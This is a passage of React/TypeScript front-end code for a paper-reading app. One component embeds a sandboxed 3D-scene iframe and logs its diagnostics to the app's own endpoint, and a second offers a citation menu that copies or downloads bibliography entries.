  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [failureCode, setFailureCode] = useState<string | null>(null);
  const failed = failureCode === code;

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;
    const delivered = new Set<string>();
    let deliveredCount = 0;

    const onMessage = (event: MessageEvent<unknown>) => {
      if (event.source !== iframe.contentWindow) return;
      if (!isThreeDiagnostic(event.data)) return;
      if (event.data.kind !== "console-error") setFailureCode(code);
      const fingerprint = JSON.stringify(event.data);
      if (delivered.has(fingerprint) || deliveredCount >= 8) return;
      delivered.add(fingerprint);
      deliveredCount += 1;
      void fetch("/api/v1/client-logs", {
        method: "POST",
        credentials: "include",
        keepalive: true,
        headers: { "Content-Type": "application/json" },
        body: fingerprint,
      }).catch(() => undefined);
    };
    const announceReady = () => {
      iframe.contentWindow?.postMessage(
        "papernook-three-diagnostics-ready",
        "*",
      );
    };

    window.addEventListener("message", onMessage);
    iframe.addEventListener("load", announceReady);
    announceReady();
    return () => {
      window.removeEventListener("message", onMessage);
      iframe.removeEventListener("load", announceReady);
    };
  }, [code]);

  return (
    <div className={styles.wrapper}>
      <iframe
        ref={iframeRef}
        className={styles.frame}
        sandbox="allow-scripts"
        src={threeSandboxUrl(code)}
        title="Interactive 3D scene"
        loading="lazy"
      />
      {failed && onRegenerate && (
        <button
          type="button"
          className={styles.regenerate}
          onClick={onRegenerate}
        >
          Regenerate in chat
        </button>
      )}
    </div>
  );
}

"use client";

import { useState } from "react";
import styles from "./CitationActions.module.css";

interface CitationActionsProps {
  topic: string;
  slug: string;
}

export function CitationActions({ topic, slug }: CitationActionsProps) {
  const [status, setStatus] = useState<string | null>(null);
  const base = `/api/v1/papers/${topic}/${slug}/citation`;

  async function copyBibliography(
    format: "apa" | "harvard" | "vancouver",
    label: string,
  ): Promise<void> {
    setStatus(null);
    try {
      const response = await fetch(`${base}?format=${format}`, {
        credentials: "include",
      });
      if (!response.ok) {
        setStatus("Could not format this citation.");
        return;
      }
      await navigator.clipboard.writeText(await response.text());
      setStatus(`${label} bibliography entry copied.`);
    } catch {
      setStatus("Could not copy this citation.");
    }
  }

  return (
    <div className={styles.root}>
      <details className={styles.menu}>
        <summary>Cite</summary>
        <div className={styles.panel}>
          <button
            type="button"
            onClick={() => void copyBibliography("apa", "APA")}
          >
            Copy APA
          </button>
          <button
            type="button"
            onClick={() => void copyBibliography("harvard", "Harvard")}
          >
            Copy Harvard
          </button>
          <button
            type="button"
            onClick={() => void copyBibliography("vancouver", "Vancouver")}
          >
            Copy Vancouver
          </button>
          <a href={`${base}?format=csl-json`}>CSL JSON</a>
          <a href={`${base}?format=ris`}>RIS</a>
          <a href={`${base}?format=bibtex`}>BibTeX</a>
        </div>
      </details>
      {status && (
        <span className={styles.status} role="status">
          {status}
        </span>
      )}
    </div>
  );
}

